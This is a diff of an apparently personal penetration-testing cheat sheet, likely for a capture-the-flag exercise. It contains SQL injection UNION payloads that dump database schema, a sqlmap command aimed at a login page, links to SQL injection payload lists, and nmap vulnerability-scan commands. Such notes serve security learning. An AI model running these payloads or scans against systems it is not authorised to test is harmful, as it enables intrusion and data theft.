@@ -25,7 +25,9 @@ Cheatsheet: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypa
 ' UNION select 1,table_schema,table_name from information_schema.tables #<br />
 ' UNION select 1,table_name,column_name from information_schema.columns #<br /><br />
 
-sqlmap --url http://tbfc.net/login.php --tables --columns
+sqlmap --url http://tbfc.net/login.php --tables --columns <br/>
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+- https://github.com/payloadbox/sql-injection-payload-list
 ### Nmap
 Scan for vulnerabilities: nmap -Pn --script vuln 10.x.x.x
 nmap --script http-enum -p 80 xx.xx.xx.xx  <br />
